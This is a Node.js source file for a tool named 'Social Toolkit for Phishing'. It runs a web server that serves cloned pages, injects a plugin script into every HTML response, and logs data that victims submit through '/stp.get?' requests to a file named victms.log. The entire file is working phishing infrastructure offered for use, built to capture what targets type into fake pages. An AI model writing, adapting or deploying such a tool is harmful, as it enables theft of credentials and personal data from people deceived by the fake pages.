
/* 
		[STP] Social Toolkit for Phishing
		Author   : Redtoor
		Version  : 1.0
		
*/

var net = require('net');
var http = require('http');
var fs = require('fs');
var url = require('url');
var path = require('path');
eval.apply(global, [fs.readFileSync('config.js').toString()]);
var payload = fs.readFileSync("./stp.plugin.js");


extensions = {
    ".html" : "text/html",
    ".css" : "text/css",
    ".js" : "application/javascript",
    ".png" : "image/png",
    ".gif" : "image/gif",
    ".jpg" : "image/jpeg",
    ".json" : "text/html",
};

function debugConsole(message){
	console.log(message);
}

function getFileRequest(filePath,res,page404,mimeType,ext){
      fs.exists(filePath,function(exists){
          if(exists){
              fs.readFile(filePath,function(err,contents){
                  if(!err){
                      res.writeHead(200,{
                          "Content-type" : mimeType,
                          "Content-Length" : contents.length+payload.length+17
                      });
                      if (ext == ".html" || ext == "") {res.end(contents+"<script>"+payload+"</script>");}else{res.end(contents);}
                  } else {
                  };
              });
          } else {
              fs.readFile(page404,function(err,contents){
                  if(!err){
                      res.writeHead(404, {'Content-Type': 'text/html'});
                      res.end(contents);
                  } else {};
              });
          };
      });
};

function saveData(datas){
	var serializer = datas.substring(9,datas.length);
  fs.appendFile("./logs/victms.log", 'DATA      : '+serializer+'\n\n\n', function (err) {});
}

function requestHandler(req, res) {
	try{
	    var
	    fileName = req.url,
	    ext = path.extname(fileName),
	    localFolder = __dirname + Plataform,
	    page404 = localFolder + '404.html';
      	var array = fileName.split('/');
      	var lastsegment = array[array.length-2];
      	if(fileName=="/") fileName = "index.html";
      	if(fileName.substring(0,9) == "/stp.get?") {debugConsole(" {+} Event Submit was detected."); saveData(fileName);}
      	getFileRequest((localFolder + fileName),res,page404,extensions[ext],ext);
    }catch(err){debugConsole(err);}
};

function stp(){
	try{
		debugConsole("\n {#} Social ToolKit Phishing.")
		debugConsole(" {*} Loading Setting.");
		debugConsole(" {*} Plataform "+Plataform+" - Port "+HTTPport);
		debugConsole(" {*} Starting Server in localhost:"+HTTPport);
		http.createServer(requestHandler).listen(HTTPport);
	}catch(err){debugConsole(err);}
}

stp();